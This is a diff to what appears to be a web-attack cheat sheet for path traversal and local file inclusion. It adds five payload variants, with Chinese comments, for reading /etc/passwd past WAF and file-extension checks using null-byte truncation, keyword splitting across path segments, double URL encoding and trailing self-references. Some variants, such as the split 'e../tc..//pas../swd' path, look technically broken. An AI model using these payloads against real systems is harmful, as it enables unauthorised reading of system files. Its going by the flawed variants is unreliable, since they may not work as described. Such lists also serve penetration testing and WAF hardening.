@@ -34,6 +34,11 @@ web.config  .env  application.properties  wp-config.php  config.php  settings.py
 /var/www/../../etc/passwd         # absolute + traversal
 /%2e%2e/%2e%2e/etc/passwd
 path truncation: /etc/passwd/././././... (4096+ chars, old PHP)
+# --- @Zerodaylabowner 2026-09 补充变体 (吸收自 X) ---
+../../../etc/./passwd%00.png      # 规范化差异 + 伪后缀: /./ 吞掉后 %00 截断扩展名校验
+../..././..././..././e../tc..//pas../swd   # 段内插点: 关键词被劈进多个路径段, 关键词特征 WAF 匹配不到
+..%2%35%32F..%2%35%32Fetc%2%35%32Fpasswd   # 双重编码劈开: %2%35=%25 再解一层才是 %2f, 单层解码层全 miss
+../../../etc/./passwd/./././././  # 尾部自引用: 绕过「必须以文件名结尾」的文件型校验
 ```
 
 ## PHP wrappers - read source
